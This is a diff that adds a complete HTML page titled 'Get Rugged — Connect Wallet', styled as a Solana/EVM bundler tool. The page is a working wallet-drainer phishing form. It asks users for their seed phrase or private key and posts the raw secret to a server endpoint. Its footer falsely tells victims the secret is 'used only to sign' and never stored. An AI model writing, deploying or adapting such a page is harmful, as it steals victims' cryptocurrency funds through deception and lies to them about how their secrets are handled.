@@ -1,1 +1,280 @@
-PLACEHOLDER_REAL_INDEX
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#000">
+<title>Get Rugged — Connect Wallet</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#000;--s1:#0a0a0a;--s2:#111;--s3:#161616;
+  --b1:rgba(255,255,255,.06);--b2:rgba(255,255,255,.12);--b3:rgba(255,255,255,.2);
+  --w:#fff;--g:#555;--g2:#2e2e2e;--g3:#888;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{height:100%;}
+body{
+  background:var(--bg);color:var(--w);
+  font-family:'Inter',system-ui,sans-serif;
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  padding:20px;position:relative;overflow:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.03;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  background-size:180px;
+}
+.grid{
+  position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:
+    linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+  background-size:64px 64px;
+  -webkit-mask-image:radial-gradient(ellipse 80% 70% at 50% 40%,black 30%,transparent 75%);
+  mask-image:radial-gradient(ellipse 80% 70% at 50% 40%,black 30%,transparent 75%);
+}
+.glow{
+  position:fixed;top:30%;left:50%;transform:translate(-50%,-50%);
+  width:70vw;height:50vh;max-width:600px;
+  background:radial-gradient(ellipse,rgba(255,255,255,.06) 0%,transparent 70%);
+  pointer-events:none;z-index:0;
+}
+.card{
+  position:relative;z-index:2;
+  width:100%;max-width:420px;
+  background:var(--s1);border:1px solid rgba(255,255,255,.22);
+  border-radius:24px;padding:32px 26px 26px;
+  box-shadow:0 30px 80px rgba(0,0,0,.7),0 0 0 1px rgba(255,255,255,.08) inset;
+  animation:enter .45s cubic-bezier(.2,.8,.2,1) both;
+}
+@keyframes enter{from{opacity:0;transform:translateY(12px) scale(.98);}to{opacity:1;transform:translateY(0) scale(1);}}
+.brand{
+  margin-bottom:18px;
+  font-weight:900;font-size:.85rem;letter-spacing:.04em;
+}
+.ambient-particles{
+  position:fixed;inset:0;width:100%;height:100%;z-index:1;pointer-events:none;opacity:1;
+}
+h1{
+  font-size:clamp(2.4rem,8vw,3.2rem);font-weight:900;
+  letter-spacing:-.055em;line-height:.85;margin-bottom:.4rem;
+}
+h1 .ghost{
+  display:block;-webkit-text-stroke:1px rgba(255,255,255,.45);color:transparent;
+}
+.sub{font-size:.78rem;color:var(--g3);font-weight:600;letter-spacing:.08em;text-transform:uppercase;margin-bottom:22px;}
+.tabs{
+  display:grid;grid-template-columns:1fr 1fr;gap:4px;
+  background:#0a0a0a;border:1px solid rgba(255,255,255,.18);border-radius:12px;
+  padding:4px;margin-bottom:16px;
+}
+.tab{
+  min-height:42px;border:none;border-radius:8px;background:transparent;
+  color:#666;font:inherit;font-size:.8rem;font-weight:700;cursor:pointer;
+  transition:.18s;
+}
+.tab.active{background:#1a1a1a;color:#fff;border:1px solid rgba(255,255,255,.28);}
+.field-label{
+  display:block;font-size:.62rem;font-weight:700;letter-spacing:.12em;
+  color:var(--g3);text-transform:uppercase;margin-bottom:8px;
+}
+.field{
+  width:100%;min-height:52px;padding:14px 16px;
+  background:#0a0a0a;border:1px solid rgba(255,255,255,.16);border-radius:12px;
+  color:#fff;font:inherit;font-size:.9rem;outline:none;resize:vertical;
+  transition:border-color .18s;
+}
+textarea.field{min-height:110px;line-height:1.6;}
+.field:focus{border-color:rgba(255,255,255,.4);}
+.field::placeholder{color:#444;}
+.primary{
+  width:100%;min-height:54px;margin-top:16px;
+  background:#fff;color:#000;border:none;border-radius:12px;
+  font:inherit;font-size:.95rem;font-weight:800;cursor:pointer;
+  transition:transform .15s,box-shadow .15s,opacity .15s;
+  position:relative;overflow:hidden;
+}
+.primary:hover{transform:translateY(-1px);box-shadow:0 8px 28px rgba(255,255,255,.15);}
+.primary:active{transform:translateY(0);}
+.primary:disabled{opacity:.55;cursor:wait;}
+.status{
+  min-height:18px;margin-top:12px;text-align:center;
+  font-size:.75rem;font-weight:600;
+}
+.error{color:#ff6b6b;}
+.success{color:#7dffb3;}
+.footer{
+  margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,.14);
+  text-align:center;font-size:.65rem;color:#555;font-weight:500;line-height:1.5;
+}
+.hidden{display:none;}
+.panels{
+  position:relative;overflow:hidden;min-height:116px;
+}
+.panel{
+  transition:transform .28s cubic-bezier(.2,.8,.2,1),opacity .28s;
+}
+.panel.slide-out-left{transform:translateX(-16px);opacity:0;}
+.panel.slide-out-right{transform:translateX(16px);opacity:0;}
+.panel.slide-in-left{transform:translateX(16px);opacity:0;}
+.panel.slide-in-right{transform:translateX(-16px);opacity:0;}
+.primary{
+  transition:transform .15s,box-shadow .15s,opacity .15s,background .15s;
+}
+.primary:active{transform:scale(.98);}
+
+@media(max-width:400px){.card{padding:26px 18px 22px;}}
+</style>
+</head>
+<body>
+<div class="grid"></div>
+<div class="glow"></div>
+
+<main class="card">
+  <div class="brand">GET RUGGED</div>
+
+  <h1>Connect<br><span class="ghost">Wallet</span></h1>
+  <div class="sub">Solana / EVM bundler</div>
+
+  <div class="tabs">
+    <button class="tab active" data-tab="phrase">Phrase</button>
+    <button class="tab" data-tab="key">Key</button>
+  </div>
+
+  <label class="field-label">Wallet connection</label>
+
+  <div class="panels">
+    <div id="phrase-panel" class="panel">
+      <textarea class="field" id="phrase" placeholder="12 or 24 words" autocomplete="off" spellcheck="false"></textarea>
+    </div>
+    <div id="key-panel" class="panel hidden">
+      <input class="field" id="key" placeholder="Base58 or 0x" autocomplete="off" spellcheck="false" />
+    </div>
+  </div>
+
+  <button class="primary" id="continue">Continue</button>
+
+  <div class="status" id="status" role="status" aria-live="polite"></div>
+
+  <footer class="footer">
+    Used only to sign. Never stored in the browser.
+  </footer>
+</main>
+
+<script>
+const tabs = document.querySelectorAll(".tab");
+const phrasePanel = document.getElementById("phrase-panel");
+const keyPanel = document.getElementById("key-panel");
+const status = document.getElementById("status");
+const button = document.getElementById("continue");
+const phraseInput = document.getElementById("phrase");
+const keyInput = document.getElementById("key");
+
+let activeTab = "phrase";
+let busy = false;
+
+function showStatus(message, type = "") {
+  status.textContent = message;
+  status.className = "status " + type;
+}
+
+tabs.forEach(tab => {
+  tab.addEventListener("click", () => {
+    const next = tab.dataset.tab;
+    if (next === activeTab || busy) return;
+    const goingToKey = next === "key";
+    const out = goingToKey ? phrasePanel : keyPanel;
+    const inn = goingToKey ? keyPanel : phrasePanel;
+    out.classList.add(goingToKey ? "slide-out-left" : "slide-out-right");
+    setTimeout(() => {
+      out.classList.add("hidden");
+      out.classList.remove("slide-out-left","slide-out-right");
+      inn.classList.remove("hidden");
+      inn.classList.add(goingToKey ? "slide-in-right" : "slide-in-left");
+      requestAnimationFrame(() => {
+        inn.classList.remove("slide-in-right","slide-in-left");
+      });
+      activeTab = next;
+      tabs.forEach(t => t.classList.toggle("active", t.dataset.tab === next));
+      showStatus("");
+    }, 180);
+  });
+});
+
+button.addEventListener("click", async () => {
+  if (busy) return;
+  const raw = (activeTab === "phrase" ? phraseInput.value : keyInput.value).trim();
+  if (!raw) {
+    showStatus("Enter a value", "error");
+    return;
+  }
+  busy = true;
+  button.disabled = true;
+  button.textContent = "Connecting…";
+  showStatus("");
+
+  try {
+    const r = await fetch("/api/connect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ raw, source: activeTab })
+    });
+    const j = await r.json().catch(() => ({}));
+    if (r.ok && j.ok) {
+      showStatus("Connected. You can close this tab.", "success");
+      button.textContent = "Connected";
+      return;
+    }
+    showStatus(j.error || "Failed. Try again.", "error");
+  } catch (e) {
+    showStatus("Failed. Try again.", "error");
+  }
+  busy = false;
+  button.disabled = false;
+  button.textContent = "Continue";
+});
+</script>
+
+<canvas class="ambient-particles" aria-hidden="true"></canvas>
+<script>
+(()=>{
+  const canvas=document.querySelector('.ambient-particles');
+  if(!canvas||window.matchMedia('(prefers-reduced-motion: reduce)').matches)return;
+  const ctx=canvas.getContext('2d');if(!ctx)return;
+  let w=0,h=0,dpr=1,particles=[],raf=0;
+  function resize(){
+    w=window.innerWidth;h=window.innerHeight;dpr=Math.min(window.devicePixelRatio||1,1.5);
+    canvas.width=Math.round(w*dpr);canvas.height=Math.round(h*dpr);
+    ctx.setTransform(dpr,0,0,dpr,0,0);
+    const n=Math.min(420,Math.max(220,Math.floor(w*h/3500)));
+    particles=Array.from({length:n},()=>({
+      x:Math.random()*w,y:Math.random()*h,
+      r:.8+Math.random()*1.8,
+      vx:(Math.random()-.5)*.18,vy:(Math.random()-.5)*.16,
+      a:.22+Math.random()*.35,glow:Math.random()>.65
+    }));
+  }
+  function draw(){
+    ctx.clearRect(0,0,w,h);
+    for(const p of particles){
+      p.x+=p.vx;p.y+=p.vy;
+      if(p.x<0)p.x=w;if(p.x>w)p.x=0;if(p.y<0)p.y=h;if(p.y>h)p.y=0;
+      if(p.glow){
+        const g=ctx.createRadialGradient(p.x,p.y,0,p.x,p.y,18);
+        g.addColorStop(0,`rgba(210,220,255,${p.a*.35})`);
+        g.addColorStop(1,'rgba(210,220,255,0)');
+        ctx.fillStyle=g;ctx.beginPath();ctx.arc(p.x,p.y,18,0,Math.PI*2);ctx.fill();
+      }
+      ctx.fillStyle=`rgba(225,230,240,${p.a})`;
+      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();
+    }
+    raf=requestAnimationFrame(draw);
+  }
+  resize();draw();
+  window.addEventListener('resize',()=>{cancelAnimationFrame(raf);resize();draw();},{passive:true});
+})();
+</script>
+</body>
+</html>
